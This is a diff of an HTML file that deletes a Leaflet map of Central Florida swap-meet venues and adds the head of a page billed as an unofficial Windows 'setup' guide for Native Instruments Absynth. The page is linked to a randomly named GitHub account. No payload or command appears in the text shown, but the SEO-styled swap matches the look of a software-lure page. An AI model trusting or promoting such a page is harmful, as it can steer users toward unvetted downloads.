@@ -1,1526 +1,169 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    
-    <meta http-equiv="content-type" content="text/html; charset=UTF-8" />
-    <script src="https://cdn.jsdelivr.net/npm/leaflet@1.9.3/dist/leaflet.js"></script>
-    <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.2/dist/js/bootstrap.bundle.min.js"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/Leaflet.awesome-markers/2.0.2/leaflet.awesome-markers.js"></script>
-    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/leaflet@1.9.3/dist/leaflet.css"/>
-    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.2/dist/css/bootstrap.min.css"/>
-    <link rel="stylesheet" href="https://netdna.bootstrapcdn.com/bootstrap/3.0.0/css/bootstrap-glyphicons.css"/>
-    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.2.0/css/all.min.css"/>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/Leaflet.awesome-markers/2.0.2/leaflet.awesome-markers.css"/>
-    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/python-visualization/folium/folium/templates/leaflet.awesome.rotate.min.css"/>
-    
-            <meta name="viewport" content="width=device-width,
-                initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
-            <style>
-                #map_cdeaa2c39c1ee89fddb41611cba312c8 {
-                    position: relative;
-                    width: 100.0%;
-                    height: 100.0%;
-                    left: 0.0%;
-                    top: 0.0%;
-                }
-                .leaflet-container { font-size: 1rem; }
-            </style>
-
-            <style>html, body {
-                width: 100%;
-                height: 100%;
-                margin: 0;
-                padding: 0;
-            }
-            </style>
-
-            <style>#map {
-                position:absolute;
-                top:0;
-                bottom:0;
-                right:0;
-                left:0;
-                }
-            </style>
-
-            <script>
-                L_NO_TOUCH = false;
-                L_DISABLE_3D = false;
-            </script>
-
-        
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>native-instruments-absynth-setup - Simplify Your Absynth Installation</title>
+    <meta name="description" content="Get native-instruments-absynth-setup for Windows. Simple setup notes, workflow checklists, and session logs to help you install and run Absynth smoothly. Unofficial Windows setup guide.">
+    <meta name="keywords" content="native-instruments-absynth-setup, setup, windows, absynth, native instruments, install guide">
+    <meta name="author" content="Trembling Reenactor">
+    <meta property="og:title" content="native-instruments-absynth-setup - Simplify Your Absynth Installation">
+    <meta property="og:description" content="Get native-instruments-absynth-setup for Windows. Simple setup notes, checklists, and session logs for Absynth.">
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://github.com/trembling-reenactor91/native-instruments-absynth-setup">
 </head>
-<body>
-    
-    
-<div style="
-position: fixed; 
-top: 12px; right: 12px; width: 370px; max-height: 92vh; overflow-y: auto;
-background-color: white; z-index:9999; padding:14px 16px;
-border:2px solid #333; border-radius:8px;
-font-family: Arial, sans-serif; font-size:13px; line-height:1.3;
-box-shadow:0 2px 10px rgba(0,0,0,.25);">
-<h3 style="margin:0 0 8px 0;">Central Florida Swap Locations</h3>
-<div style="margin-bottom:10px; color:#444;">Numbered markers correspond to the list below.</div>
-<div style='margin-bottom:6px;'><b>1. Casselberry</b> — Seminole County Library<br><span style='color:#333;'>215 N Oxford Rd, Casselberry, FL 32707</span></div>
-<div style='margin-bottom:6px;'><b>2. Chickasaw</b> — Chickasaw Library<br><span style='color:#333;'>870 N Chickasaw Trail, Chickasaw, FL 32825</span></div>
-<div style='margin-bottom:6px;'><b>3. Dr. Phillips</b> — Southwest Library<br><span style='color:#333;'>7255 Della Dr, Dr. Phillips, FL 32819</span></div>
-<div style='margin-bottom:6px;'><b>4. East Orlando</b> — Alafaya Library<br><span style='color:#333;'>12000 E Colonial Dr, East Orlando, FL 32826</span></div>
-<div style='margin-bottom:6px;'><b>5. Maitland</b> — Maitland Library<br><span style='color:#333;'>501 Maitland Ave, Maitland, FL 32751</span></div>
-<div style='margin-bottom:6px;'><b>6. Ocoee</b> — West Oaks Library<br><span style='color:#333;'>1821 E Silver Star Rd, Ocoee, FL 34761</span></div>
-<div style='margin-bottom:6px;'><b>7. South Orlando</b> — South Creek Library<br><span style='color:#333;'>1702 Deerfield Blvd, South Orlando, FL 32837</span></div>
-<div style='margin-bottom:6px;'><b>8. Winter Garden</b> — Winter Garden Library<br><span style='color:#333;'>805 E Plant St, Winter Garden, FL 34787</span></div>
-<div style='margin-bottom:6px;'><b>9. West Orlando</b> — St. Luke's Church<br><span style='color:#333;'>4851 S Apopka Vineland Rd, West Orlando, FL 32819</span></div>
-<div style='margin-bottom:6px;'><b>10. Belleview</b> — Marion County Library<br><span style='color:#333;'>13145 SE County Hwy 484, Belleview, FL 34420</span></div>
-<div style='margin-bottom:6px;'><b>11. DeLand</b> — DeLand Library<br><span style='color:#333;'>130 East Howry Ave, DeLand, FL 32724</span></div>
-<div style='margin-bottom:6px;'><b>12. Gainesville</b> — Meizon Church<br><span style='color:#333;'>3411 NW 83rd St, Gainesville, FL 32606</span></div>
-<div style='margin-bottom:6px;'><b>13. Lake Mary</b> — North West Library<br><span style='color:#333;'>580 Green Way Blvd, Lake Mary, FL 32746</span></div>
-<div style='margin-bottom:6px;'><b>14. Mount Dora</b> — W.T. Bland Library<br><span style='color:#333;'>1995 N Donnelly St, Mount Dora, FL 32757</span></div>
-<div style='margin-bottom:6px;'><b>15. Ocala</b> — Silver Springs Rec Center<br><span style='color:#333;'>590 Silver Rd, Ocala, FL 34472</span></div>
-<div style='margin-bottom:6px;'><b>16. Port Orange</b> — Elks Club #2723<br><span style='color:#333;'>5207 S Ridgewood Ave, Port Orange, FL 32127</span></div>
-<div style='margin-bottom:6px;'><b>17. Avon Park</b> — American Legion Post 69<br><span style='color:#333;'>1301 W Bell St, Avon Park, FL 33825</span></div>
-<div style='margin-bottom:6px;'><b>18. Bartow</b> — Bartow Library<br><span style='color:#333;'>2150 S Broadway Ave, Bartow, FL 33830</span></div>
-<div style='margin-bottom:6px;'><b>19. Beverly Hills</b> — Central Ridge Library<br><span style='color:#333;'>425 West Roosevelt Blvd, Beverly Hills, FL 34465</span></div>
-<div style='margin-bottom:6px;'><b>20. Clermont</b> — Cagan Crossings Library<br><span style='color:#333;'>16729 Cagan Oaks, Clermont, FL 34714</span></div>
-<div style='margin-bottom:6px;'><b>21. Cocoa</b> — Catherine S. Rood Library<br><span style='color:#333;'>308 Forrest Ave, Cocoa, FL 32922</span></div>
-<div style='margin-bottom:6px;'><b>22. Dundee</b> — Dundee Library<br><span style='color:#333;'>202 E Main St, Dundee, FL 33838</span></div>
-<div style='margin-bottom:6px;'><b>23. Kissimmee</b> — Hart Memorial Library<br><span style='color:#333;'>211 E Dakin Ave, Kissimmee, FL 34741</span></div>
-<div style='margin-bottom:6px;'><b>24. Seffner</b> — Seffner-Mango Library<br><span style='color:#333;'>410 Kingsway Rd, Seffner, FL 33584</span></div>
-<div style='margin-bottom:6px;'><b>25. Tampa</b> — New Tampa Regional Library<br><span style='color:#333;'>10001 Cross Creek Blvd, Tampa, FL 33647</span></div>
-<div style='margin-bottom:6px;'><b>26. Tarpon Springs</b> — Consignment Emporium<br><span style='color:#333;'>9 S Safford Ave, Tarpon Springs, FL 34689</span></div>
-<div style='margin-bottom:6px;'><b>27. Thonotosassa</b> — Thonotosassa Library<br><span style='color:#333;'>10715 Main St, Thonotosassa, FL 33592</span></div>
-<div style='margin-bottom:6px;'><b>28. Wesley Chapel</b> — New River Library<br><span style='color:#333;'>34043 FL-54, Wesley Chapel, FL 33543</span></div>
-<div style='margin-bottom:6px;'><b>29. West Tampa</b> — Town 'N Country Library<br><span style='color:#333;'>7606 Paula Dr, West Tampa, FL 33615</span></div>
-<div style='margin-bottom:6px;'><b>30. Melbourne</b> — Suntree-Viera Library<br><span style='color:#333;'>902 Jordan Blass Rd, Melbourne, FL 32940</span></div>
-<div style='margin-bottom:6px;'><b>31. Lake Wales</b> — Lake Wales Library<br><span style='color:#333;'>290 Cypress Garden Ln, Lake Wales, FL 33853</span></div>
-<div style='margin-bottom:6px;'><b>32. Dunnellon</b> — Dunnellon Library<br><span style='color:#333;'>20351 Robinson Rd, Dunnellon, FL 34431</span></div>
-</div>
-    
-            <div class="folium-map" id="map_cdeaa2c39c1ee89fddb41611cba312c8" ></div>
-        
-</body>
-<script>
-    
-    
-            var map_cdeaa2c39c1ee89fddb41611cba312c8 = L.map(
-                "map_cdeaa2c39c1ee89fddb41611cba312c8",
-                {
-                    center: [28.489421874999998, -81.71811249999999],
-                    crs: L.CRS.EPSG3857,
-                    ...{
-  "zoom": 8,
-  "zoomControl": true,
-  "preferCanvas": false,
-}
-
-                }
-            );
-
-            
-
-        
-    
-            var tile_layer_ed9a526cf97773e1b2cd751b11114512 = L.tileLayer(
-                "https://tile.openstreetmap.org/{z}/{x}/{y}.png",
-                {
-  "minZoom": 0,
-  "maxZoom": 19,
-  "maxNativeZoom": 19,
-  "noWrap": false,
-  "attribution": "\u0026copy; \u003ca href=\"https://www.openstreetmap.org/copyright\"\u003eOpenStreetMap\u003c/a\u003e contributors",
-  "subdomains": "abc",
-  "detectRetina": false,
-  "tms": false,
-  "opacity": 1,
-}
-
-            );
-        
-    
-            tile_layer_ed9a526cf97773e1b2cd751b11114512.addTo(map_cdeaa2c39c1ee89fddb41611cba312c8);
-        
-    
-            var marker_0d8af0f40977c2147b1389fcb64b7848 = L.marker(
-                [28.6686, -81.3264],
-                {
-}
-            ).addTo(map_cdeaa2c39c1ee89fddb41611cba312c8);
-        
-    
-            var div_icon_07e5672c811e3d52863989bba20a331f = L.divIcon({
-  "html": "\n        \u003cdiv style=\"\n            background:#ffffff;\n            border:2px solid #222;\n            border-radius:50%;\n            width:28px;\n            height:28px;\n            text-align:center;\n            line-height:24px;\n            font-weight:700;\n            font-size:12px;\n            color:#111;\n            box-shadow:0 1px 4px rgba(0,0,0,.35);\"\u003e\n            1\n        \u003c/div\u003e\n        ",
-  "className": "empty",
-});
-        
-    
-        var popup_1d702ebb3c2458ae0abb832ba94987aa = L.popup({
-  "maxWidth": 280,
-});
-
-        
-            
-                var html_70e5057bb9eae51e4ae5e54b55453458 = $(`<div id="html_70e5057bb9eae51e4ae5e54b55453458" style="width: 100.0%; height: 100.0%;">     <div style="font-family: Arial; font-size: 13px;">       <b>1. Casselberry</b><br>       Seminole County Library<br>       215 N Oxford Rd<br>       Casselberry, FL 32707     </div>     </div>`)[0];
-                popup_1d702ebb3c2458ae0abb832ba94987aa.setContent(html_70e5057bb9eae51e4ae5e54b55453458);
-            
-        
-
-        marker_0d8af0f40977c2147b1389fcb64b7848.bindPopup(popup_1d702ebb3c2458ae0abb832ba94987aa)
-        ;
-
-        
-    
-    
-            marker_0d8af0f40977c2147b1389fcb64b7848.bindTooltip(
-                `<div>
-                     1. Casselberry — Seminole County Library
-                 </div>`,
-                {
-  "sticky": true,
-}
-            );
-        
-    
-                marker_0d8af0f40977c2147b1389fcb64b7848.setIcon(div_icon_07e5672c811e3d52863989bba20a331f);
-            
-    
-            var marker_2ad3cd3d8b195e6dc4919f9ab5eefe9c = L.marker(
-                [28.5584, -81.273],
-                {
-}
-            ).addTo(map_cdeaa2c39c1ee89fddb41611cba312c8);
-        
-    
-            var div_icon_bb9aebbf0c50e8fcac9b5b9a30b6ea11 = L.divIcon({
-  "html": "\n        \u003cdiv style=\"\n            background:#ffffff;\n            border:2px solid #222;\n            border-radius:50%;\n            width:28px;\n            height:28px;\n            text-align:center;\n            line-height:24px;\n            font-weight:700;\n            font-size:12px;\n            color:#111;\n            box-shadow:0 1px 4px rgba(0,0,0,.35);\"\u003e\n            2\n        \u003c/div\u003e\n        ",
-  "className": "empty",
-});
-        
-    
-        var popup_57ef3365cea9562b85004427ba8069ba = L.popup({
-  "maxWidth": 280,
-});
-
-        
-            
-                var html_76f53c0d9bafdfe73614a4964869337a = $(`<div id="html_76f53c0d9bafdfe73614a4964869337a" style="width: 100.0%; height: 100.0%;">     <div style="font-family: Arial; font-size: 13px;">       <b>2. Chickasaw</b><br>       Chickasaw Library<br>       870 N Chickasaw Trail<br>       Chickasaw, FL 32825     </div>     </div>`)[0];
-                popup_57ef3365cea9562b85004427ba8069ba.setContent(html_76f53c0d9bafdfe73614a4964869337a);
-            
-        
-
-        marker_2ad3cd3d8b195e6dc4919f9ab5eefe9c.bindPopup(popup_57ef3365cea9562b85004427ba8069ba)
-        ;
-
-        
-    
-    
-            marker_2ad3cd3d8b195e6dc4919f9ab5eefe9c.bindTooltip(
-                `<div>
-                     2. Chickasaw — Chickasaw Library
-                 </div>`,
-                {
-  "sticky": true,
-}
-            );
-        
-    
-                marker_2ad3cd3d8b195e6dc4919f9ab5eefe9c.setIcon(div_icon_bb9aebbf0c50e8fcac9b5b9a30b6ea11);
-            
-    
-            var marker_22facc24a0685acca01f34c96adcb4f3 = L.marker(
-                [28.455, -81.491],
-                {
-}
-            ).addTo(map_cdeaa2c39c1ee89fddb41611cba312c8);
-        
-    
-            var div_icon_726c20401a836eb4e025c44b0c7f8688 = L.divIcon({
-  "html": "\n        \u003cdiv style=\"\n            background:#ffffff;\n            border:2px solid #222;\n            border-radius:50%;\n            width:28px;\n            height:28px;\n            text-align:center;\n            line-height:24px;\n            font-weight:700;\n            font-size:12px;\n            color:#111;\n            box-shadow:0 1px 4px rgba(0,0,0,.35);\"\u003e\n            3\n        \u003c/div\u003e\n        ",
-  "className": "empty",
-});
-        
-    
-        var popup_fd5cffd2b8f3c2e1408439704ccfaa94 = L.popup({
-  "maxWidth": 280,
-});
-
-        
-            
-                var html_5c0e2b0a06be45662b8b6894eabeed84 = $(`<div id="html_5c0e2b0a06be45662b8b6894eabeed84" style="width: 100.0%; height: 100.0%;">     <div style="font-family: Arial; font-size: 13px;">       <b>3. Dr. Phillips</b><br>       Southwest Library<br>       7255 Della Dr<br>       Dr. Phillips, FL 32819     </div>     </div>`)[0];
-                popup_fd5cffd2b8f3c2e1408439704ccfaa94.setContent(html_5c0e2b0a06be45662b8b6894eabeed84);
-            
-        
-
-        marker_22facc24a0685acca01f34c96adcb4f3.bindPopup(popup_fd5cffd2b8f3c2e1408439704ccfaa94)
-        ;
-
-        
-    
-    
-            marker_22facc24a0685acca01f34c96adcb4f3.bindTooltip(
-                `<div>
-                     3. Dr. Phillips — Southwest Library
-                 </div>`,
-                {
-  "sticky": true,
-}
-            );
-        
-    
-                marker_22facc24a0685acca01f34c96adcb4f3.setIcon(div_icon_726c20401a836eb4e025c44b0c7f8688);
-            
-    
-            var marker_86a8601bb8058dc52dc853a13e92c3a8 = L.marker(
-                [28.5675, -81.2075],
-                {
-}
-            ).addTo(map_cdeaa2c39c1ee89fddb41611cba312c8);
-        
-    
-            var div_icon_64b947a086972449092705c6c14a170b = L.divIcon({
-  "html": "\n        \u003cdiv style=\"\n            background:#ffffff;\n            border:2px solid #222;\n            border-radius:50%;\n            width:28px;\n            height:28px;\n            text-align:center;\n            line-height:24px;\n            font-weight:700;\n            font-size:12px;\n            color:#111;\n            box-shadow:0 1px 4px rgba(0,0,0,.35);\"\u003e\n            4\n        \u003c/div\u003e\n        ",
-  "className": "empty",
-});
-        
-    
-        var popup_7e3581ece4b4c6b621fc859aaec2cc71 = L.popup({
-  "maxWidth": 280,
-});
-
-        
-            
-                var html_deb6a00dc8951b248d8a27b0b3b0b8a3 = $(`<div id="html_deb6a00dc8951b248d8a27b0b3b0b8a3" style="width: 100.0%; height: 100.0%;">     <div style="font-family: Arial; font-size: 13px;">       <b>4. East Orlando</b><br>       Alafaya Library<br>       12000 E Colonial Dr<br>       East Orlando, FL 32826     </div>     </div>`)[0];
-                popup_7e3581ece4b4c6b621fc859aaec2cc71.setContent(html_deb6a00dc8951b248d8a27b0b3b0b8a3);
-            
-        
-
-        marker_86a8601bb8058dc52dc853a13e92c3a8.bindPopup(popup_7e3581ece4b4c6b621fc859aaec2cc71)
-        ;
-
-        
-    
-    
-            marker_86a8601bb8058dc52dc853a13e92c3a8.bindTooltip(
-                `<div>
-                     4. East Orlando — Alafaya Library
-                 </div>`,
-                {
-  "sticky": true,
-}
-            );
-        
-    
-                marker_86a8601bb8058dc52dc853a13e92c3a8.setIcon(div_icon_64b947a086972449092705c6c14a170b);
-            
-    
-            var marker_08825becc6539027cf44e5461f4b5f54 = L.marker(
-                [28.6294, -81.3656],
-                {
-}
-            ).addTo(map_cdeaa2c39c1ee89fddb41611cba312c8);
-        
-    
-            var div_icon_ac0c5775cfb9212ce3d7373cbbdc1a2c = L.divIcon({
-  "html": "\n        \u003cdiv style=\"\n            background:#ffffff;\n            border:2px solid #222;\n            border-radius:50%;\n            width:28px;\n            height:28px;\n            text-align:center;\n            line-height:24px;\n            font-weight:700;\n            font-size:12px;\n            color:#111;\n            box-shadow:0 1px 4px rgba(0,0,0,.35);\"\u003e\n            5\n        \u003c/div\u003e\n        ",
-  "className": "empty",
-});
-        
-    
-        var popup_31d2dfdb6df3ba2aa0974b256b0e1362 = L.popup({
-  "maxWidth": 280,
-});
-
-        
-            
-                var html_a2af1cf783bd332a05da559249570233 = $(`<div id="html_a2af1cf783bd332a05da559249570233" style="width: 100.0%; height: 100.0%;">     <div style="font-family: Arial; font-size: 13px;">       <b>5. Maitland</b><br>       Maitland Library<br>       501 Maitland Ave<br>       Maitland, FL 32751     </div>     </div>`)[0];
-                popup_31d2dfdb6df3ba2aa0974b256b0e1362.setContent(html_a2af1cf783bd332a05da559249570233);
-            
-        
-
-        marker_08825becc6539027cf44e5461f4b5f54.bindPopup(popup_31d2dfdb6df3ba2aa0974b256b0e1362)
-        ;
-
-        
-    
-    
-            marker_08825becc6539027cf44e5461f4b5f54.bindTooltip(
-                `<div>
-                     5. Maitland — Maitland Library
-                 </div>`,
-                {
-  "sticky": true,
-}
-            );
-        
-    
-                marker_08825becc6539027cf44e5461f4b5f54.setIcon(div_icon_ac0c5775cfb9212ce3d7373cbbdc1a2c);
-            
-    
-            var marker_cfb919999725ddf04dd7c255b186ff50 = L.marker(
-                [28.5744, -81.543],
-                {
-}
-            ).addTo(map_cdeaa2c39c1ee89fddb41611cba312c8);
-        
-    
-            var div_icon_a936bffe50746c742e1e1bf7e028ca9b = L.divIcon({
-  "html": "\n        \u003cdiv style=\"\n            background:#ffffff;\n            border:2px solid #222;\n            border-radius:50%;\n            width:28px;\n            height:28px;\n            text-align:center;\n            line-height:24px;\n            font-weight:700;\n            font-size:12px;\n            color:#111;\n            box-shadow:0 1px 4px rgba(0,0,0,.35);\"\u003e\n            6\n        \u003c/div\u003e\n        ",
-  "className": "empty",
-});
-        
-    
-        var popup_922804af4bdc7f799c176bedd1ba1f38 = L.popup({
-  "maxWidth": 280,
-});
-
-        
-            
-                var html_d06d0f85c94ba50bc1c5fb5498a9461b = $(`<div id="html_d06d0f85c94ba50bc1c5fb5498a9461b" style="width: 100.0%; height: 100.0%;">     <div style="font-family: Arial; font-size: 13px;">       <b>6. Ocoee</b><br>       West Oaks Library<br>       1821 E Silver Star Rd<br>       Ocoee, FL 34761     </div>     </div>`)[0];
-                popup_922804af4bdc7f799c176bedd1ba1f38.setContent(html_d06d0f85c94ba50bc1c5fb5498a9461b);
-            
-        
-
-        marker_cfb919999725ddf04dd7c255b186ff50.bindPopup(popup_922804af4bdc7f799c176bedd1ba1f38)
-        ;
-
-        
-    
-    
-            marker_cfb919999725ddf04dd7c255b186ff50.bindTooltip(
-                `<div>
-                     6. Ocoee — West Oaks Library
-                 </div>`,
-                {
-  "sticky": true,
-}
-            );
-        
-    
-                marker_cfb919999725ddf04dd7c255b186ff50.setIcon(div_icon_a936bffe50746c742e1e1bf7e028ca9b);
-            
-    
-            var marker_4c3aee5cba1ad8869a1119ff20bd804e = L.marker(
-                [28.3821, -81.4058],
-                {
-}
-            ).addTo(map_cdeaa2c39c1ee89fddb41611cba312c8);
-        
-    
-            var div_icon_67ffed174a987b30b093c9e0f6a15624 = L.divIcon({
-  "html": "\n        \u003cdiv style=\"\n            background:#ffffff;\n            border:2px solid #222;\n            border-radius:50%;\n            width:28px;\n            height:28px;\n            text-align:center;\n            line-height:24px;\n            font-weight:700;\n            font-size:12px;\n            color:#111;\n            box-shadow:0 1px 4px rgba(0,0,0,.35);\"\u003e\n            7\n        \u003c/div\u003e\n        ",
-  "className": "empty",
-});
-        
-    
-        var popup_c2a87f5672ef18e0646059ab3228660a = L.popup({
-  "maxWidth": 280,
-});
-
-        
-            
-                var html_2171b0e1b2c717d5576e52749d3fc827 = $(`<div id="html_2171b0e1b2c717d5576e52749d3fc827" style="width: 100.0%; height: 100.0%;">     <div style="font-family: Arial; font-size: 13px;">       <b>7. South Orlando</b><br>       South Creek Library<br>       1702 Deerfield Blvd<br>       South Orlando, FL 32837     </div>     </div>`)[0];
-                popup_c2a87f5672ef18e0646059ab3228660a.setContent(html_2171b0e1b2c717d5576e52749d3fc827);
-            
-        
-
-        marker_4c3aee5cba1ad8869a1119ff20bd804e.bindPopup(popup_c2a87f5672ef18e0646059ab3228660a)
-        ;
-
-        
-    
-    
-            marker_4c3aee5cba1ad8869a1119ff20bd804e.bindTooltip(
-                `<div>
-                     7. South Orlando — South Creek Library
-                 </div>`,
-                {
-  "sticky": true,
-}
-            );
-        
-    
-                marker_4c3aee5cba1ad8869a1119ff20bd804e.setIcon(div_icon_67ffed174a987b30b093c9e0f6a15624);
-            
-    
-            var marker_b3a9f9f20bc2a4415cd317c7d1af6e87 = L.marker(
-                [28.5653, -81.5805],
-                {
-}
-            ).addTo(map_cdeaa2c39c1ee89fddb41611cba312c8);
-        
-    
-            var div_icon_4b7d4dc2ae037f40ff12fe9304308be8 = L.divIcon({
-  "html": "\n        \u003cdiv style=\"\n            background:#ffffff;\n            border:2px solid #222;\n            border-radius:50%;\n            width:28px;\n            height:28px;\n            text-align:center;\n            line-height:24px;\n            font-weight:700;\n            font-size:12px;\n            color:#111;\n            box-shadow:0 1px 4px rgba(0,0,0,.35);\"\u003e\n            8\n        \u003c/div\u003e\n        ",
-  "className": "empty",
-});
-        
-    
-        var popup_64b5c4c9d28eb5904d1dab728ad1dad3 = L.popup({
-  "maxWidth": 280,
-});
-
-        
-            
-                var html_d0a5a7ddc51cfae69fa16bfebca634cb = $(`<div id="html_d0a5a7ddc51cfae69fa16bfebca634cb" style="width: 100.0%; height: 100.0%;">     <div style="font-family: Arial; font-size: 13px;">       <b>8. Winter Garden</b><br>       Winter Garden Library<br>       805 E Plant St<br>       Winter Garden, FL 34787     </div>     </div>`)[0];
-                popup_64b5c4c9d28eb5904d1dab728ad1dad3.setContent(html_d0a5a7ddc51cfae69fa16bfebca634cb);
-            
-        
-
-        marker_b3a9f9f20bc2a4415cd317c7d1af6e87.bindPopup(popup_64b5c4c9d28eb5904d1dab728ad1dad3)
-        ;
-
-        
-    
-    
-            marker_b3a9f9f20bc2a4415cd317c7d1af6e87.bindTooltip(
-                `<div>
-                     8. Winter Garden — Winter Garden Library
-                 </div>`,
-                {
-  "sticky": true,
-}
-            );
-        
-    
-                marker_b3a9f9f20bc2a4415cd317c7d1af6e87.setIcon(div_icon_4b7d4dc2ae037f40ff12fe9304308be8);
-            
-    
-            var marker_f529e506e68b745b523ca7b137dd47d4 = L.marker(
-                [28.489, -81.506],
-                {
-}
-            ).addTo(map_cdeaa2c39c1ee89fddb41611cba312c8);
-        
-    
-            var div_icon_3eafa290d2d5461e9a4293453a9ba650 = L.divIcon({
-  "html": "\n        \u003cdiv style=\"\n            background:#ffffff;\n            border:2px solid #222;\n            border-radius:50%;\n            width:28px;\n            height:28px;\n            text-align:center;\n            line-height:24px;\n            font-weight:700;\n            font-size:12px;\n            color:#111;\n            box-shadow:0 1px 4px rgba(0,0,0,.35);\"\u003e\n            9\n        \u003c/div\u003e\n        ",
-  "className": "empty",
-});
-        
-    
-        var popup_43e8a36c3e20b680ff060506040f0dce = L.popup({
-  "maxWidth": 280,
-});
-
-        
-            
-                var html_1048bc8cff754433830d984a6c639d4a = $(`<div id="html_1048bc8cff754433830d984a6c639d4a" style="width: 100.0%; height: 100.0%;">     <div style="font-family: Arial; font-size: 13px;">       <b>9. West Orlando</b><br>       St. Luke's Church<br>       4851 S Apopka Vineland Rd<br>       West Orlando, FL 32819     </div>     </div>`)[0];
-                popup_43e8a36c3e20b680ff060506040f0dce.setContent(html_1048bc8cff754433830d984a6c639d4a);
-            
-        
-
-        marker_f529e506e68b745b523ca7b137dd47d4.bindPopup(popup_43e8a36c3e20b680ff060506040f0dce)
-        ;
-
-        
-    
-    
-            marker_f529e506e68b745b523ca7b137dd47d4.bindTooltip(
-                `<div>
-                     9. West Orlando — St. Luke's Church
-                 </div>`,
-                {
-  "sticky": true,
-}
-            );
-        
-    
-                marker_f529e506e68b745b523ca7b137dd47d4.setIcon(div_icon_3eafa290d2d5461e9a4293453a9ba650);
-            
-    
-            var marker_e0b06ab23353f8f730213c053c4101e6 = L.marker(
-                [29.0553, -82.062],
-                {
-}
-            ).addTo(map_cdeaa2c39c1ee89fddb41611cba312c8);
-        
-    
-            var div_icon_bec0f61c24482fbcd514441748c0223b = L.divIcon({
-  "html": "\n        \u003cdiv style=\"\n            background:#ffffff;\n            border:2px solid #222;\n            border-radius:50%;\n            width:28px;\n            height:28px;\n            text-align:center;\n            line-height:24px;\n            font-weight:700;\n            font-size:12px;\n            color:#111;\n            box-shadow:0 1px 4px rgba(0,0,0,.35);\"\u003e\n            10\n        \u003c/div\u003e\n        ",
-  "className": "empty",
-});
-        
-    
-        var popup_7bc91356e23b475018a92201f704e4e3 = L.popup({
-  "maxWidth": 280,
-});
-
-        
-            
-                var html_054466565d505b93bdcee609403e223c = $(`<div id="html_054466565d505b93bdcee609403e223c" style="width: 100.0%; height: 100.0%;">     <div style="font-family: Arial; font-size: 13px;">       <b>10. Belleview</b><br>       Marion County Library<br>       13145 SE County Hwy 484<br>       Belleview, FL 34420     </div>     </div>`)[0];
-                popup_7bc91356e23b475018a92201f704e4e3.setContent(html_054466565d505b93bdcee609403e223c);
-            
-        
-
-        marker_e0b06ab23353f8f730213c053c4101e6.bindPopup(popup_7bc91356e23b475018a92201f704e4e3)
-        ;
-
-        
-    
-    
-            marker_e0b06ab23353f8f730213c053c4101e6.bindTooltip(
-                `<div>
-                     10. Belleview — Marion County Library
-                 </div>`,
-                {
-  "sticky": true,
-}
-            );
-        
-    
-                marker_e0b06ab23353f8f730213c053c4101e6.setIcon(div_icon_bec0f61c24482fbcd514441748c0223b);
-            
-    
-            var marker_51646a775e99d01644ac8a0ce044332c = L.marker(
-                [29.026, -81.303],
-                {
-}
-            ).addTo(map_cdeaa2c39c1ee89fddb41611cba312c8);
-        
-    
-            var div_icon_a27ef39e1bfd942ff8bbd6d2df4f717c = L.divIcon({
-  "html": "\n        \u003cdiv style=\"\n            background:#ffffff;\n            border:2px solid #222;\n            border-radius:50%;\n            width:28px;\n            height:28px;\n            text-align:center;\n            line-height:24px;\n            font-weight:700;\n            font-size:12px;\n            color:#111;\n            box-shadow:0 1px 4px rgba(0,0,0,.35);\"\u003e\n            11\n        \u003c/div\u003e\n        ",
-  "className": "empty",
-});
-        
-    
-        var popup_82945847023d719ecd3f236968978b79 = L.popup({
-  "maxWidth": 280,
-});
-
-        
-            
-                var html_5f6eef7293321c26ffafafb6c48f112f = $(`<div id="html_5f6eef7293321c26ffafafb6c48f112f" style="width: 100.0%; height: 100.0%;">     <div style="font-family: Arial; font-size: 13px;">       <b>11. DeLand</b><br>       DeLand Library<br>       130 East Howry Ave<br>       DeLand, FL 32724     </div>     </div>`)[0];
-                popup_82945847023d719ecd3f236968978b79.setContent(html_5f6eef7293321c26ffafafb6c48f112f);
-            
-        
-
-        marker_51646a775e99d01644ac8a0ce044332c.bindPopup(popup_82945847023d719ecd3f236968978b79)
-        ;
-
-        
-    
-    
-            marker_51646a775e99d01644ac8a0ce044332c.bindTooltip(
-                `<div>
-                     11. DeLand — DeLand Library
-                 </div>`,
-                {
-  "sticky": true,
-}
-            );
-        
-    
-                marker_51646a775e99d01644ac8a0ce044332c.setIcon(div_icon_a27ef39e1bfd942ff8bbd6d2df4f717c);
-            
-    
-            var marker_4f217fd88104a269c5fd9896d9c6d599 = L.marker(
-                [29.685, -82.431],
-                {
-}
-            ).addTo(map_cdeaa2c39c1ee89fddb41611cba312c8);
-        
-    
-            var div_icon_dd8fde796fbfe6b005fa03a2eb1a864c = L.divIcon({
-  "html": "\n        \u003cdiv style=\"\n            background:#ffffff;\n            border:2px solid #222;\n            border-radius:50%;\n            width:28px;\n            height:28px;\n            text-align:center;\n            line-height:24px;\n            font-weight:700;\n            font-size:12px;\n            color:#111;\n            box-shadow:0 1px 4px rgba(0,0,0,.35);\"\u003e\n            12\n        \u003c/div\u003e\n        ",
-  "className": "empty",
-});
-        
-    
-        var popup_d1f588fcfaf91519cb53ee7b1695cd87 = L.popup({
-  "maxWidth": 280,
-});
-
-        
-            
-                var html_111df9267d470c5841826b14f741a0b4 = $(`<div id="html_111df9267d470c5841826b14f741a0b4" style="width: 100.0%; height: 100.0%;">     <div style="font-family: Arial; font-size: 13px;">       <b>12. Gainesville</b><br>       Meizon Church<br>       3411 NW 83rd St<br>       Gainesville, FL 32606     </div>     </div>`)[0];
-                popup_d1f588fcfaf91519cb53ee7b1695cd87.setContent(html_111df9267d470c5841826b14f741a0b4);
-            
-        
-
-        marker_4f217fd88104a269c5fd9896d9c6d599.bindPopup(popup_d1f588fcfaf91519cb53ee7b1695cd87)
-        ;
-
-        
-    
-    
-            marker_4f217fd88104a269c5fd9896d9c6d599.bindTooltip(
-                `<div>
-                     12. Gainesville — Meizon Church
